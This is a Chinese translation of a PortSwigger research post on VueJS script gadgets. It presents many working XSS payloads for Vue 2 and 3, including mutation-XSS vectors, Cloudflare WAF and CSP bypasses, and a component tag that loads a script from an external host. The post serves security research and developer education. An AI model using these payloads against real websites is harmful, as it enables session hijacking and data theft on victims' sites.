---
layout: post
title: 使用VueJS脚本小工具规避防御
---

## 介紹

我们发现，流行的JavaScript框架VueJS提供了对网站安全有严重影响的功能。如果您遇到使用Vue的Web应用程序，本篇文章将帮助您理解由脚本小工具创建的Vue特定XSS向量，您可以使用这些脚本小工具来利用目标。

脚本小工具是一些由框架创建的额外功能，可以导致JavaScript执行。这些功能可以是JavaScript或基于HTML的。gadgets脚本通常对绕过WAF和CSP等防御措施很有用。从开发者的角度来看，了解一个框架或库创建的所有脚本小工具也是很有用的；当允许用户在自己的Web应用程序中输入时，这些知识可以帮助防止XSS漏洞。在本篇文章中，我们将涵盖从基于表达式的向量到突变XSS（mXSS）等多种技术。

### 注意

这里有很多信息!如果你对学习攻击框架感兴趣，你可能会想读完全部内容。但如果你遇到了特定的场景，只是需要一个解决它的向量，你可以直接跳到我们[XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)中新更新的VueJS部分。

在这篇文章中，我们将涵盖:

1.指令

2.缩短payload

3.事件

4.突变

5.适用V3的payload

6.传送

7.使用案例


## 一切都是从哪里开始的？

在[推特](https://twitter.com/PortSwiggerRes/status/1265647826383634432?s=20)上讨论各种 VueJS 攻击的时候，我、[Lewis Ardern](https://twitter.com/LewisArdern) 和 [PwnFunction](https://twitter.com/PwnFunction) 决定创建一篇博文来更详细地介绍它们。我们的合作非常有趣，并想出了一些有趣的向量。这一切都始于尝试缩减以下[VueJS XSS向量](https://portswigger-labs.net/xss/vuejs2.php?x=%7B%7BtoString().constructor.constructor(%27alert(1)%27)()%7D%7D)。
```
{ {toString().constructor.constructor('alert(1)')()} }
```

为了解决如何缩减它，我们需要看看我们的向量是如何被转换的。我们查看VueJS源码，搜索Function构造函数的调用。有些情况下，Function构造函数被调用了，但创建的函数却没有。我们跳过了这些实例，因为我们确信这不是我们的代码被转换的地方。[在第11648行，我们最终找到了一个调用生成函数的Function构造函数](https://github.com/vuejs/vue/blob/6fe07ebf5ab3fea1860c59fe7cdd2ec1b760f9b0/src/compiler/to-function.js#L14)。
```
return new Function(code)
```

我们在这一行添加了一个断点，并刷新了页面。然后我们检查了代码变量的内容，果然，我们可以看到我们的向量。代码在一个with语句中，后面是一个return语句。因此，执行代码的范围是在with语句中指定的对象内。基本上，这意味着没有全局的alert()函数，但在with作用域内，有VueJS函数，如_c、_v和_s。

如果我们使用这些函数，我们就可以减少表达式的大小。这个函数的构造函数将是Function构造函数，它允许我们执行代码。这意味着我们可以将向量减少到。
```
{ {_c.constructor('alert(1)')()} }
```

### 调试VueJS

在我们继续之前，也许应该先快速了解一下我们使用的调试工具。

[Vue Devtools](https://github.com/vuejs/vue-devtools)。官方的浏览器扩展，可以用来调试用VueJS构建的应用。

[Vue-template-compiler](https://www.npmjs.com/package/vue-template-compiler)。将模板编译成渲染函数，这可以帮助我们看到Vue内部如何表示模板。这个工具有一个方便的在线版本，叫做[template-explorer](https://template-explorer.vuejs.org/)。

我们还不时地重写VueJS原型，添加日志等功能，以便我们可以看到内部发生的事情。

## VueJS第2版

### 指令

就像其他框架一样，VueJS中的一些指令让我们的生活变得更轻松.几乎每一个VueJS指令都可以作为一个gadgets来利用。让我们来看一个例子。

#### v-show指令

```
<p v-show="_c.constructor`alert(1)`()">
```
这是一段比较简单的代码。有一个叫做v-show的指令，用来根据逻辑条件从DOM中显示或隐藏一个元素。在这种情况下，条件就是向量。

这个非常相同的向量可以应用于其他指令，包括v-for、v-model、v-on等。

#### v-on指令
```
<x v-on:click='_b.constructor`alert(1)`()'>click</x>
```

#### v-bind 指令
```
<x v-bind:a='_b.constructor`alert(1)`()'>
```
这些gadgets的多样性可以帮助你创建灵活的向量，可以很容易地用于绕过WAFs。

### 最小化向量
最小化向量--也被称为 "代码高尔夫"--意味着找到用尽可能少的字符或字节达到同样结果的方法。我们最初假设最短的向量是模板表达式，这意味着我们必须使用4个字节来添加所需的大括号{ { } }。然而，这个假设被证明是错误的。

我们花了大量的时间调试、查看源代码和阅读文档。我们找不到任何通过模板缩短矢量的方法，于是我们开始研究标签。

我们从35个字节开始，最终向上爬。但在这个过程中，通过使用VueJS解析器的怪癖，我们发现了一些非常有趣的向量。
```
<x @[_b.constructor`alert(1)`()]> (35 bytes)
<x :[_b.constructor`alert(1)`()]>  (33 bytes)
<p v-=_c.constructor`alert(1)`()> (33 bytes)
<x #[_c.constructor`alert(1)`()]> (33 bytes)
<p :=_c.constructor`alert(1)`()> (32 bytes)
```

但更短的还是模板向量。
```
{ {_c.constructor('alert(1)')()} }  (32 bytes)
{ {_b.constructor`alert(1)`()} }    (30 bytes)
```
在尝试了无数种方法来编写高尔夫代码，只是为了能让它在30个字节以内，我们最终在[Vue API](https://vuejs.org/v2/api/#is)中遇到了[动态组件](https://vuejs.org/v2/guide/components.html#Dynamic-Components)。

动态组件本质上是可以在稍后的时间点改变为不同的组件。这是通过使用标签上的is属性实现的。考虑下面的例子。
```
<x v-bind:is="'script'" src="//14.rs" />
```

这可以缩短为：
```
<x is=script src=//⑭.₨>
```

现在只有23个字节了！这是我们在整个研究过程中能想到的VueJS v2最短的向量。这是我们在整个研究过程中能想到的VueJS v2最短的向量。

### 事件

就像AngularJS一样，VueJS定义了一个名为$event的特殊对象，它引用了浏览器中的事件对象。使用这个$event对象，你可以访问浏览器窗口对象，允许你调用任何你喜欢的东西。
```
<img src @error="e=$event.path;e[e.length-1].alert(1)">
<img src @error="e=$event.path.pop().alert(1)">
```

我们确定@error会执行表达式，由于VueJS提供了[速记语法](https://vuejs.org/v2/guide/syntax.html#v-on-Shorthand)，这使得你可以用@代替使用v-on指令为错误或点击等事件的处理程序打前缀。文档中还透露，你可以[使用$event变量](https://vuejs.org/v2/guide/events.html#Methods-in-Inline-Handlers)来访问原始DOM事件。

这些向量的工作得益于Chrome在事件执行时定义的一个特殊路径属性。这个属性包含一个触发事件的对象数组。对我们来说至关重要的是，窗口对象总是这个数组中的最后一个元素。composedPath()函数会在其他浏览器中生成一个类似的数组，这使得我们可以构建一个跨浏览器向量，如下所示。
```
<img src @error="e=$event.composedPath().pop().alert(1)">
```
然后我们开始研究如何减少基于事件的向量，并注意到VueJS中一些有趣的行为。VueJS生成的重写代码使用了这一点，并没有使用严格模式。因此，当使用一个函数时，这指的是窗口对象，允许一个更短的向量。
```
<img src @error=this.alert(1)>
```
这个概念也可以不使用事件来证明。
```
{ {-function(){this.alert(1)}()} }
```
由于注入的函数继承了全局对象window，当在一个函数内部时，它指向window对象。

我们设法通过使用SVG标签和加载事件来进一步减少基于事件的向量。
```
<svg @load=this.alert(1)> 
```
一开始，我们认为这已经是最小的可能了。但后来我们有了一个想法--如果VueJS在解析这些特殊事件时，也许它允许做一些普通HTML不允许做的事情。当然，它是允许的。
```
<svg@load=this.alert(1)>
```
### 沉默的水槽
默认情况下，当AngularJS（版本1）和VueJS等框架渲染页面时，它们不会执行超前（AoT）完成。这个怪癖意味着，如果你能够在使用该框架的模板内注入，你可能会偷偷插入自己的任意有效载荷，并将其执行。

当一个应用程序已经部分重构为使用新的框架，但仍然包含依赖于额外第三方库的遗留代码时，这有时会导致问题。一个很好的例子是VueJS和JQuery。JQuery库暴露了各种方法，比如[text()](https://api.jquery.com/text/)。就其本身而言，这对XSS是相对安全的，因为它的输出是HTML编码的。然而，当你将其与一个使用Mustache风格的模板语法（如{ { } }）的框架结合起来时，再加上一个只执行文本操作的方法，如$('#message').text(userInput)，这可能会导致一个 "沉默 "的水槽。这是一个有趣的攻击向量，因为你在一般被认为是安全的方法中引入了一个新的漏洞。例如，在这个[fiddle](https://jsfiddle.net/4r02y3qa/)中，注意到只有第二个payload被执行。
```

$('#message').text("'><script>alert(1)<\/script>'");
$('#message1').text("{ {_c.constructor('alert(2)')()} }")
```

## 突变XSS

然后，我们开始研究突变XSS（[mXSS](https://portswigger.net/research/mxss)）向量，以及如何使用VueJS来引起它们。传统上，mXSS向量需要在DOM中进行修改才能突变，反射输入通常不会突变，因为DOM在被注入后没有被修改。然而，在VueJS的情况下，表达式和HTML会被解析并随后被修改，这意味着DOM的修改确实会发生。因此，被HTML过滤器过滤的反射输入会变成mXSS!

我们发现的第一个突变是由VueJS解析属性的方式引起的。如果你在属性名中使用引号，VueJS就会感到困惑，解码属性值，然后删除无效的属性名。这将导致mXSS，[并渲染iframe](https://portswigger-labs.net/xss/vuejs2.php?x=%3Cx%20title%22=%22%26lt;iframe%26Tab;onload%26Tab;=alert(1)%26gt;%22%3E)。

输入：
```
<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">
```
输出：
```
"="<iframe onload="alert(1)">"></iframe>
```
当从一个相对的URL引用VueJS时，这个方法是可行的，但是当使用unpkg.com域来服务JS时，会返回一个403的结果，因为服务器使用Cloudflare，而Cloudflare会因为referrer中的向量而阻止这个请求。我们通过一些小技巧就能绕过这个问题。
```
<a href="https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20title%22=%22%26lt;iframe%26Tab;onload%26Tab;=setTimeout(top.name)%26gt;%22%3E" target=alert(1337)>test</a>
```

我们使用htmlentities欺骗Cloudflare WAF允许onload事件，然后使用setTimeout()，将窗口名称传递给它并执行，然后。后来，我们发现，你可以[简化bypass](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20title%22=%22%26lt;iframe%26Tab;onload%26Tab;=setTimeout(/alert(1)/.source)%26gt;%22%3E)如下。
```
<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"> 
```
我们还对更多的突变进行了摸索，发现以下例子也发生了突变。
```
<x < x="&lt;iframe onload=alert(0)&gt;">
<x = x="&lt;iframe onload=alert(0)&gt;">
<x ' x="&lt;iframe onload=alert(0)&gt;">
```
进一步的实验发现了其他的mXSS行为。通常情况下，模板标签内的标签不会被渲染。然而，事实证明，VueJS删除了< template>标签，同时留下了里面的标签。剩下的标签就会被渲染。

输入：
```
<template><iframe></iframe></template>
```
在开发工具控制台输入这个。
```
document.body.innerHTML+=''
```
输出：
```
<iframe></iframe>
```
由于VueJS正在删除< template>标签，我们想知道是否可以利用这个标签来引起突变。我们将< template>标签放置在另一个标签中，并[惊讶地看到这种突变](https://portswigger-labs.net/xss/vuejs.php?x=%3Cxmp%3E%3C%3Ctemplate%3E%3C/template%3E/xmp%3E%3C%3Ctemplate%3E%3C/template%3Eiframe%3E%3C/xmp%3E)。

输入：
```
<xmp><<template></template>/xmp><<template></template>iframe></xmp>

```
在开发工具控制台输入这个。
```
document.body.innerHTML+=''
```
输出：
```
<xmp></xmp><iframe></xmp>
```

我们还发现，< noscript>也会随着DOM的操作而变异。
```
<noscript>&lt;/noscript&gt;&lt;iframe&gt;</noscript>
```
在开发工具控制台输入这个。
```
document.body.innerHTML+=''
```
这一点甚至适用于XMP。
输入：
```
<xmp>&lt;/xmp&gt;&lt;iframe&gt;</xmp>
```
在开发工具控制台输入这个。
```
document.body.innerHTML+=''
```
我们最终发现，这些突变也可以通过< noframes>、< noembed>和< iframe>元素实现。这很有趣，但我们真正需要的是一种通过VueJS来实现突变的方法，而不需要任何手动的DOM操作。在我们寻找突变的过程中，我们意识到VueJS会使HTML发生突变。我们想出了一个简单的测试来证明这一点。通常情况下，如果你把一个标签放在另一个标签中，只有第一个标签会被渲染，因为没有为第二个标签找到收尾>。另一方面，VueJS实际上会[为你突变并删除第一个标签](https://portswigger-labs.net/xss/vuejs2.php?x=%3Cxyz%3Cimg/src%20onerror=alert(1)%3E%3E)。

输入：
```
<xyz<img/src onerror=alert(1)>>
```
输出：
```
<img src="" onerror="alert(1)">&gt;
```
接下来，我们需要创建一个矢量，在变异后变得危险之前，绕过HTML过滤器。经过许多小时的尝试，我们发现，如果你使用多个SVG标签，会导致DOM被VueJS修改。这就造成了突变，[把反射的XSS变成了mXSS](https://portswigger-labs.net/xss/vuejs2.php?x=%3Csvg%3E%3Csvg%3E%3Cb%3E%3Cnoscript%3E%26lt;/noscript%26gt;%26lt;iframe%26Tab;onload=alert(1)%26gt;%3C/noscript%3E%3C/b%3E%3C/svg%3E)。
输入：
```
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=alert(1)&gt;</noscript></b></svg>
```
输出：
```
<p><svg><svg></svg></svg><b><noscript></noscript><iframe onload="alert(1)"></iframe></b></p>
```
最后，这里有另一个突变并[绕过Cloudflare WAF的PoC](https://portswigger-labs.net/xss/vuejs.php?x=%3Csvg%3E%3Csvg%3E%3Cb%3E%3Cnoscript%3E%26lt;/noscript%26gt;%26lt;iframe%26Tab;onload=setTimeout(/alert(1)/.source)%26gt;%3C/noscript%3E%3C/b%3E%3C/svg%3E)。
输入：
```
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>
```
输出：
```
<svg><svg></svg></svg><b><noscript></noscript><iframe onload="setTimeout(/alert(1)/.source)"></iframe></b>
```
### 突变和CSP

我们注意到，当CSP被启用时，突变并没有工作，这是因为它们包含了正常的DOM事件处理程序，而它们被CSP阻止了。这是因为它们包含了正常的DOM事件处理程序，它们被CSP阻止了。但是我们有一个想法--如果我们在突变的HTML中注入VueJS的特殊事件会怎样？这将由VueJS渲染，执行我们的代码和自定义事件处理程序，从而绕过CSP。我们不确定突变后的DOM是否会执行这些处理程序，但是，令我们高兴的是，它确实执行了。

首先，我们将突变向量注入图像，并使用VueJS @error事件处理程序。当DOM被突变时，图像会和@error处理程序一起呈现。然后，我们使用特殊的$event对象来获取对window的引用，并执行我们的alert()。

输入。
```
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;img/src/&Tab;@error=$event.path.pop().alert(1)&gt;</noscript></b></svg>
```
输出：
```
<p><svg><svg></svg></svg><b><noscript></noscript><img src=""></b></p>
```
突变后的DOM不会显示@error事件，但它仍然会执行。你可以在下面的例子中看到这一点。

[启用CSP的mXSS](https://portswigger-labs.net/xss/vue3.php?x=%3Csvg%3E%3Csvg%3E%3Cb%3E%3Cnoscript%3E%26lt;/noscript%26gt;%26lt;img/src/%26Tab;@error=$event.path.pop().alert(1)%26gt;%3C/noscript%3E%3C/b%3E%3C/svg%3E&csp=1)

本节中的突变向量也将在第3版中工作。

[POC](https://portswigger-labs.net/xss/vue3.php?x=%3Csvg%3E%3Csvg%3E%3Cb%3E%3Cnoscript%3E%26lt;/noscript%26gt;%26lt;iframe%26Tab;onload=alert(1)%26gt;%3C/noscript%3E%3C/b%3E%3C/svg%3E)

## 改编VueJS 3的payload。

当我们正在进行这项研究时，VueJS 3发布了，并且破坏了许多我们发现的向量。我们决定快速查看一下，看看是否能让它们重新工作。在第3版中，很多代码都发生了变化，例如，Function构造函数被移到了13035行，并且删除了VueJS函数的缩短版，例如_b， 。

在13055行添加断点，我们检查了代码变量的内容。看来VueJS的函数与第2版类似，只是函数名更啰嗦了。我们只需要用较长的形式来替换函数的简写。
```
{ {_openBlock.constructor('alert(1)')()} }
```

在执行表达式的范围内有几个不同的函数。

```
{ {_createBlock.constructor('alert(1)')()} }
{ {_toDisplayString.constructor('alert(1)')()} }
{ {_createVNode.constructor('alert(1)')()} }
```
本篇文章中的大部分向量都可以在v3上工作，只需使用更多的函数。
```
<p v-show="_createBlock.constructor`alert(1)`()">
```
在某些情况下，有效载荷无法执行，例如，当使用以下向量时。
```
<x @[_openBlock.constructor`alert(1)`()]>
```
这失败的原因是，VueJS将表达式转换为小写，导致它试图调用不存在的_objectblockfunction...。为了解决这个问题，我们在scope中使用了_capitalize函数。
```
<x @[_capitalize.constructor`alert(1)`()]>
```
事件还暴露了不同的功能。除了我们前面讨论的$event对象，还有_withCtx和_resolveComponent。后者有点太长，但_withCtx很好，很短。
```
<x @click=_withCtx.constructor`alert(1)`()>click</x>
```
使用$event也是一个方便的快捷方式。
```
<x @click=$event.view.alert(1)>click</x>
```
### 代码高尔夫V3

我们的向量现在可以在v3中工作，但它们仍然相当长。我们寻找更短的函数名，并注意到有一个叫做_Vue的变量，它在当前的范围内。我们将这个变量传递给Function构造函数，并使用console.log()来检查对象的内容。

{ {_createBlock.constructor('x','console.log(x)')(_Vue)} }。

这看起来只是一个对Vue全局的引用，正如我们所期望的那样，但这个对象有一个叫做h的函数，这是一个很好的、简短的函数名，我们可以用它来将向量还原成。
```
{ {_Vue.h.constructor`alert(1)`()} }
```

当我们试图找到进一步减少这种情况的方法时，我们从一个基础向量开始，注入了一个Function构造函数调用。但这一次，我们不只是调用alert()，而是将我们想要检查的对象传递给我们的函数，并使用console.log()来检查对象/代理的内容。代理是一个特殊的JavaScript对象，它允许我们拦截对被代理对象的操作。如get/set操作或函数调用。Vue使用代理，所以可以为表达式提供函数/属性，在当前范围内使用。我们使用的表达式如下。
```
{ {_Vue.h.constructor('x','console.log(x)')(this)} }
```
这将在控制台窗口中输出一个对象。如果你检查代理的[[目标]]属性，你将能够看到你可以使用的潜在函数。使用这种方法，我们确定了函数$nextTick, $watch, $forceUpdate和$emit。使用这些函数中最短的一个，我们能够产生以下向量。
```
{ {$emit.constructor`alert(1)`()} }
```
你已经看到了我们VueJS v2的最短向量。
```
<x is=script src=//14.rs>
```
这样做是行不通的，因为VueJS v3试图解析一个叫做x的组件，而这个组件因为是本地的，所以不存在。下面的代码是render()函数的一部分。
```
return function render(_ctx, _cache) {
  with (_ctx) {
    ...
    const _component_x = _resolveComponent("x")
    ...
  }
}
```
然而，有一个特殊的<component>标签，[与之并用](https://github.com/vuejs/vue-next/blob/24041b7ac1a22ca6c10bf2af81c9250af26bda34/packages/compiler-core/src/transforms/transformElement.ts#L342)的是创建动态组件。 所以我们要做的就是将x更改为component.
```
<component is=script src=//14.rs>
```
对于上面的向量，render()函数是这样的。
```
return function render(_ctx, _cache) {
  with (_ctx) {
    ...
    return (_openBlock(),
  
       _createBlock(_resolveDynamicComponent("script"),
       { src: "//⑭.₨" }))
  }
}
```
因此，VueJS v3的最短向量是31个字节。
```
<component is=script src=//⑭.₨>
```

在版本3中，可以使用DOM属性作为< component>标签的属性。这意味着您可以使用DOM属性文本，它将作为一个文本节点添加到< script>标签中，然后添加到DOM中。

```
<component is=script text=alert(1)>
```
## 传送

我们在VueJS 3中发现了一个非常有趣的新标签，叫做< teleport>。这个标签允许你通过使用to属性将< teleport>标签的内容转移到任何其他标签，该属性接受一个CSS选择器。
```
<teleport to="#x"><b>test</b></teleport> 
```
即使是文本节点，标签的内容也会被传输。这意味着我们可以对文本节点进行 HTML 编码，并在传输之前对其进行解码。这适用于
```
<script>
```
和
```
<style>
```
标签，尽管在我们的测试中，我们发现你需要一个现有的、空白的
```
<script>
```
元素:

```
<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>
```
[POC](https://portswigger-labs.net/xss/vue3.php?x=%3Cteleport%20to=script:nth-child(2)%3Ealert%26lpar;1%26rpar;%3C/teleport%3E%3C/div%3E%3Cscript%3E%3C/script%3E)

在这个例子中，当前的样式是蓝色的，但我们注入一个< teleport>标签来改变内联样式表的样式。文本就会变成红色。
```
 <teleport to="style">
    /* Can be Entity Encoded */
    h1 {
      color: red;
    }
  </teleport> 
</div> 
 <h1>aaaa</h1>
<style>
  h1 {
    color: blue;
  }
</style>
```
[POC](http://portswigger-labs.net/xss/vue3.php?x=%3Cteleport%20to=%22style%22%3E%20h1%20%26lcub;%20color:%20red;%20%7D%20%3C/teleport%3E%20%3C/div%3E%20%3Ch1%3Eaaaa%3C/h1%3E%20%3Cstyle%3E%20h1%20%7B%20color:%20blue;%20%7D%20%3C/style%3E)
你可以将HTML编码与JavaScript中的unicode转义结合起来，产生一些漂亮的向量，可能会绕过一些WAF。
```
<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>
```
[POC](http://portswigger-labs.net/xss/vue3.php?x=%3Cteleport%20to=script:nth-child(2)%3Ealert%26lpar;1%26rpar;%3C/teleport%3E%3C/div%3E%3Cscript%3E%3C/script%3E)

### 反向传送

我们还发现了一些东西，我们决定称之为 "反向传送"。我们已经讨论过VueJS有一个< teleport>标签，但如果你在模板表达式中包含一个CSS选择器，你可以将任何其他HTML元素作为目标，并将该元素的内容作为表达式执行。即使目标标签在应用程序边界之外，这也是有效的! 

当我们意识到VueJS会在表达式的整个内容上运行[querySelector](https://github.com/vuejs/vue-next/blob/fbf865d9d4744a0233db1ed6e5543b8f3ef51e8d/packages/vue/src)时，我们都相当震惊，[只要它以#开头](https://github.com/vuejs/vue-next/blob/fbf865d9d4744a0233db1ed6e5543b8f3ef51e8d/packages/vue/src)。下面的片段演示了一个带有CSS查询的表达式，其目标是类为haha的< div>。第二个表达式即使在应用程序边界之外也会被执行。
```
<div id="app">#x,.haha</div><div class=haha>{ {_Vue.h.constructor`alert(1)`()} }</div>
<!-- Notice the div above is outside the application div -->
<script src="vue3.js"></script>
<script nonce="sometoken">
const app = Vue.createApp({
  data() {
    return {
      input: '# hello'
    }
  }
})
app.mount('#app')
</script>
```

## 使用案例

在本节中，我们将仔细看看这些脚本小工具可以在哪些方面派上用场。

### WAF

让我们从Web应用防火墙开始。正如我们已经看到的那样，有相当数量的潜在小工具可以发现。由于Vue也乐于解码HTML实体，所以你很有可能绕过常见的WAF，比如Cloudflare。

### 过滤器

诸如[DOMPurify](https://github.com/cure53/DOMPurify)这样的过滤器，有一套非常好的标签和属性的白名单，以帮助阻止任何被认为不正常的东西。然而，由于它们都允许模板语法，因此在与VueJS等前端框架结合使用时，它们并不能提供强大的XSS攻击保护。

### CSP

Vue的工作方式是对内容进行词法分析，并将其解析为抽象语法树（AST）。代码作为字符串传递到渲染函数中，由于Function构造函数的eval-like功能，它在那里被执行。这意味着，CSP的定义方式必须允许VueJS和应用程序仍能正常工作。如果它包含unsafe-eval，你可以使用Vue轻松绕过CSP。请注意，对于严格的动态或nonce旁路，unsafe-eval是一个要求。

Unsafe-eval + nonce :
```
// v2
{ {_c.constructor`alert(document.currentScript.nonce)`()} } 
// v3
{ {_Vue.h.constructor`alert(document.currentScript.nonce)`()} }
```
本篇文章中的大部分向量都可以和CSP一起使用，唯一例外的是动态组件和基于传送门的向量。唯一的例外是动态组件和基于传送门的向量。这是因为它们试图在文档中附加一个脚本节点，而CSP会阻止它（取决于策略）。


## 结论

我们希望你喜欢我们的文章，就像我们喜欢写它和想出有趣的小工具一样。给查看本帖的开发者和黑客们一些建议。

- 当创建一个JavaScript框架时，或许可以考虑一下你所添加的功能给应用程序带来的攻击面。仔细思考它们可能被使用或滥用的方式。

- 对于黑客来说，当你看中一个新框架时，要深入挖掘它的功能。看看它们一般是如何使用的，以及它们可能被滥用或误用。我们建议查看底层的源码，以了解引擎下面到底发生了什么。

帖子中讨论的所有向量都已被添加到我们[VueJS部分的XSS攻略中](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)。

如果你喜欢这篇文章，请告诉我们! 
我们有兴趣对VueJS和其他客户端和服务器端框架进行更多的研究。

关于Lewis

[Lewis Ardern](https://twitter.com/LewisArdern) 是 Synopsys 的副首席顾问。他的主要专业领域是网络安全和安全工程。Lewis 喜欢为各种类型的组织和机构创建和提供网络和 JavaScript 安全等主题的安全培训。他也是Leeds Ethical Hacking Society的创始人，并帮助开发了bXSS和SecGen等项目。

关于PwnFunction

[PwnFunction](https://twitter.com/PwnFunction) 白天是一名独立的 AppSec 顾问，晚上则是一名研究员。他以其[YouTube频道](https://www.youtube.com/c/PwnFunction)而闻名。Pwn 的兴趣主要是围绕着[应用程序安全](https://portswigger.net/burp/application-security-testing)，但他也对低级别的爵士乐感兴趣，如二进制和浏览器利用。除了计算机之外，他还喜欢数学、科学和哲学。



作者：[Gareth Heyes](https://portswigger.net/research/gareth-heyes)

原文地址：https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets
